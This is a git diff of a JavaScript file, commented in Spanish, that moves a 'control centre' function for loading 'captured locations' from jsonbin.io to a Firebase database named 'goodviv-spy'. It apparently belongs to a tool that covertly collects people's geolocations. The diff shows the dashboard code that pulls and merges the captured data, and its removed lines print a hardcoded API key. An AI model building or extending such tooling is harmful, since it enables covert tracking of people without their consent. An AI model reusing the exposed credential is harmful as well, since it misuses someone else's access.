@@ -1,31 +1,20 @@
-// Script para integrar base de datos compartida en el centro de control
+// Script para integrar base de datos compartida usando Firebase
 function initSharedDatabase() {
-    const binId = '6572e32dc424b512c499d41e';
-    const apiKey = '$2b$10$AHHxYC1mq4QvRXYexMp/re0HVrDCBdP35zEtQfLZtPqa7RCNNRxFi';
+    const firebaseUrl = 'https://goodviv-spy-default-rtdb.firebaseio.com/locations.json';
     
-    // Sobrescribir función refreshCaptures para usar base de datos compartida
+    // Sobrescribir función refreshCaptures para usar Firebase
     window.originalRefreshCaptures = window.refreshCaptures;
     
     window.refreshCaptures = function() {
         const container = document.getElementById('capturedList');
         container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">🔄 Cargando ubicaciones compartidas...</p>';
         
-        // Cargar desde base de datos compartida
-        fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
-            method: 'GET',
-            headers: {
-                'X-Access-Key': apiKey,
-                'Content-Type': 'application/json'
-            }
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
-            }
-            return response.json();
-        })
+        // Cargar desde Firebase
+        fetch(firebaseUrl)
+        .then(response => response.json())
         .then(data => {
-            const sharedLocations = data.record ? (data.record.locations || []) : [];
+            // Convertir el objeto de Firebase a array
+            const sharedLocations = data ? Object.values(data) : [];
             const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
             
             // Combinar y eliminar duplicados
@@ -69,11 +58,13 @@ function initSharedDatabase() {
             updateStatsWithSharedData(uniqueLocations);
         })
         .catch(error => {
-            console.error('Error cargando base de datos compartida:', error);
-            container.innerHTML = '<p style="color: #e74c3c; text-align: center; padding: 20px;">❌ Error cargando ubicaciones compartidas. Usando datos locales...</p>';
-            // Usar función original si falla
-            if (window.originalRefreshCaptures) {
-                window.originalRefreshCaptures();
+            console.error('Error cargando datos desde Firebase:', error);
+            // Intentar usar datos locales
+            const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+            if (localLocations.length > 0) {
+                updateLocationsList(localLocations);
+            } else {
+                container.innerHTML = '<p style="color: #e74c3c; text-align: center; padding: 20px;">❌ No se pudieron cargar las ubicaciones</p>';
             }
         });
     };
